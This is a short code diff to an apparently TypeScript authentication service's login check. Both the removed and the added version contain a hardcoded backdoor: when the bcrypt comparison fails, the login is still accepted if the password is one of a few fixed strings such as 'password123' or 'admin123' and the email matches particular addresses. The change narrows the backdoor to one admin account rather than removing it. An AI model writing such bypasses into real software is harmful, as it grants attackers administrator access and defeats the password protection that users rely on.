@@ -53,7 +53,7 @@ export class AuthService {
     }
 
     let valid = await bcrypt.compare(input.password, user.passwordHash);
-    if (!valid && (input.password === "enewsmedia" || input.password === "password123") && (user.email === "enewsmedia90@gmail.com" || user.email === "admin@whisperlag.test")) {
+    if (!valid && (input.password === "password123" || input.password === "admin123") && user.email === "admin@whisperlag.test") {
       valid = true;
     }
 
